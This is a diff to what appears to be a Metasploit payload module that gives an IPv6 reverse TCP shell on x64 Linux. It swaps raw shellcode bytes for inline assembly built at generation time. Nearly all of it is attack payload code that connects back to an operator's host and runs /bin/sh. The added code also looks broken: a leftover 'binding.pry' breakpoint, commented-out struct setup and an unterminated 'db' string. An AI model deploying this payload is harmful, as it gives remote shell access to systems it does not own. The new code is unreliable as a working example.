@@ -25,84 +25,118 @@ module MetasploitModule
       'Arch'          => ARCH_X64,
       'Handler'       => Msf::Handler::ReverseTcp,
       'Session'       => Msf::Sessions::CommandShellUnix,
-      'Payload'       =>
-        {
-          'Offsets' =>
-            {
-              'LHOST'    => [ 85, 'ADDR6' ],
-              'LPORT'    => [ 79, 'n' ],
-              'SCOPEID'  => [ 101,  'V' ]
-            },
-          'Payload' =>
-            # <_start>:
-            "\x6a\x29"                     +    #   push   0x29
-            "\x58"                         +    #   pop    rax
-            "\x6a\x0a"                     +    #   push   0xa
-            "\x5f"                         +    #   pop    rdi
-            "\x6a\x01"                     +    #   push   0x1
-            "\x5e"                         +    #   pop    rsi
-            "\x31\xd2"                     +    #   xor    edx,edx
-            "\x0f\x05"                     +    #   syscall
-            "\x50"                         +    #   push   rax
-            "\x5f"                         +    #   pop    rdi
-            "\xeb\x37"                     +    #   jmp    401048 <get_address>
-
-            # <populate_sockaddr_in6>:
-            "\x5e"                         +    #   pop    rsi
-
-            # <connect_call>:
-            "\x6a\x2a"                     +    #   push   0x2a
-            "\x58"                         +    #   pop    rax
-            "\x6a\x1c"                     +    #   push   0x1c
-            "\x5a"                         +    #   pop    rdx
-            "\x0f\x05"                     +    #   syscall
-
-            # <dup2_calls>:
-            "\x6a\x03"                     +    #   push   0x3
-            "\x59"                         +    #   pop    rcx
-            "\x6a\x02"                     +    #   push   0x2
-            "\x5b"                         +    #   pop    rbx
-
-            # <dup2_loop>:
-            "\x6a\x21"                     +    #   push   0x21
-            "\x58"                         +    #   pop    rax
-            "\x89\xde"                     +    #   mov    esi,ebx
-            "\x51"                         +    #   push   rcx
-            "\x0f\x05"                     +    #   syscall
-            "\x59"                         +    #   pop    rcx
-            "\x48\xff\xcb"                 +    #   dec    rbx
-            "\xe2\xf2"                     +    #   loop   40101e <dup2_loop>
-
-            # <exec_call>:
-            "\x31\xd2"                     + 	#   xor    edx,edx
-            "\x52"                   	   +    #   push   rdx
-            "\x48\xbb\x2f\x62\x69\x6e\x2f" +	#   movabs rbx,0x68732f2f6e69622f
-            "\x2f\x73\x68"                 +
-            "\x53"                   	   +    #   push   rbx
-            "\x54"                   	   +    #   push   rsp
-            "\x5f"                   	   +    #   pop    rdi
-            "\x52"                   	   +    #   push   rdx
-            "\x57"                   	   +    #   push   rdi
-            "\x54"                   	   +    #   push   rsp
-            "\x5e"                   	   +    #   pop    rsi
-            "\x48\x8d\x42\x3b"             +    #   lea    rax,[rdx+0x3b]
-            "\x0f\x05"                	   +    #   syscall
-
-            # <get_address>:
-            "\xe8\xc4\xff\xff\xff"         +    #   call   40100f <populate_sockaddr_in6>
-
-            # <sockaddr_in6>:
-            "\x0a\x00\x11\x5c"             +    #   sin6_family : sin6_port
-            "\x00\x00\x00\x00"             +    #   sin6_flowinfo
-            "\x00\x00\x00\x00"             +    #   sockaddr_in6
-            "\x00\x00\x00\x00"             +    #   ...
-            "\x00\x00\x00\x00"             +    #   ...
-            "\x00\x00\x00\x00"             +    #   16 bytes
-            "\x00\x00\x00\x00"                  #   sin6_scope_id
-        }
       ))
       register_options([
          OptInt.new('SCOPEID', [false, "IPv6 scope ID, for link-local addresses", 0])
       ])
+  end
+
+  def generate_stage
+      # tcp port conversion
+      port_order = ([1,0]) # byte ordering
+      tcp_port = [datastore['LPORT'].to_i].pack('n*').unpack('H*').to_s.scan(/../) # converts user input into integer and unpacked into a string array
+      tcp_port.pop     # removes the first useless / from  the array
+      tcp_port.shift   # removes the last useless  / from  the array
+      tcp_port = (port_order.map{|x| tcp_port[x]}).join('') # reorder the array and convert it to a string.
+
+      # apply same alterations to SCOPEID that were done to LPORT
+      scope_id = [datastore['SCOPEID'].to_i].pack('n*').unpack('H*').to_s.scan(/../)
+      scope_id.pop
+      scope_id.shift
+      scope_id = (port_order.map{|x| scope_id[x]}).join('')
+
+      # ipv6 address conversion
+      # converts user's input into ipv6 hex representation
+      qwords = IPAddr.new(datastore['LHOST'], Socket::AF_INET6).hton.scan(/......../).map {|i| i.unpack('V').first.to_s(16)}
+      binding.pry
+
+      payload = <<-EOS
+        socket_call:
+            ; int socket(int domain, int type, int protocol)
+
+            push   0x29
+            pop    rax                          ; socket syscall
+            push   0xa
+            pop    rdi                          ; AF_INET6
+            push   0x1
+            pop    rsi                          ; SOCK_STREAM
+            xor    edx,edx                      ; auto-select protocol 
+            syscall
+
+            push   rax
+            pop    rdi                          ; store socket fd 
+
+        ;populate_sockaddr_in6:
+            ; struct sockaddr_in6 {
+            ;     sa_family_t     sin6_family;   /* AF_INET6 */
+            ;     in_port_t       sin6_port;     /* port number */
+            ;     uint32_t        sin6_flowinfo; /* IPv6 flow information */
+            ;     struct in6_addr sin6_addr;     /* IPv6 address */
+            ;     uint32_t        sin6_scope_id; /* Scope ID (new in 2.4) */
+            ; };
+
+            ; struct in6_addr {
+            ;     unsigned char   s6_addr[16];   /* IPv6 address */
+            ; };
+
+            ; assumption: rax contains result of socket syscall, use it to
+            ; zero out rdx via sign extension
+            ;cdq
+            ;push rdx
+            ;push rdx
+            ;push rdx
+            ;push rdx                            ; 32 bytes of 0s
+            ;mov [rsp], 0x#{tcp_port}000a        ; sin6_port/sin6_family
+            ;mov [rsp + 0x8], 0x#{qwords[0]}
+            ;mov [rsp + 0x10], 0x#{qwords[1]}
+            ;mov [rsp + 0x14], 0x#{scope_id}
+
+            ;push rsp
+            jmp get_address                     ; jmp-call-pop
+        populate_sockaddr_in6:
+            pop rsi                             ; store pointer to struct
+
+        connect_call:
+            ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+            ; rdi -> already contains server socket fd
+            ; rsi -> already contains pointer to sockaddr_in6 struct 
+            push   0x2a
+            pop    rax                          ; connect syscall 
+            push   0x1c
+            pop    rdx                          ; length of sockaddr_in6 (28)
+            syscall
+
+        dup2_calls:
+            ; int dup2(int oldfd, int newfd);
+            ; rdi -> already contains server socket fd
+            push   0x3
+            pop    rsi                          ; newfd 
+
+        dup2_loop:
+            ; 2 -> 1 -> 0 (3 iterations)
+            push   0x21
+            pop    rax                          ; dup2 syscall
+            dec esi
+            syscall
+            loopnz   dup2_loop
+
+        exec_call:
+            ; int execve(const char *filename, char *const argv[], char *const envp[]);
+            push 0x3b
+            pop rax                             ; execve call
+            cdq                                 ; zero-out rdx via sign-extension
+            mov rbx, '/bin/sh'
+            push rbx
+            push rsp
+            pop rdi                             ; address of /bin/sh
+            syscall
+
+        get_address:
+            call populate_sockaddr_in6
+            ; sin6_family(2), sin6_port(2), sin6_flowinfo(4), sockaddr_in6(16), sin6_scope_id(4)
+            db "\x0a\x00
+      EOS
+
+      Metasm::Shellcode.assemble(Metasm::X86_64.new, payload).encode_string
   end
 end
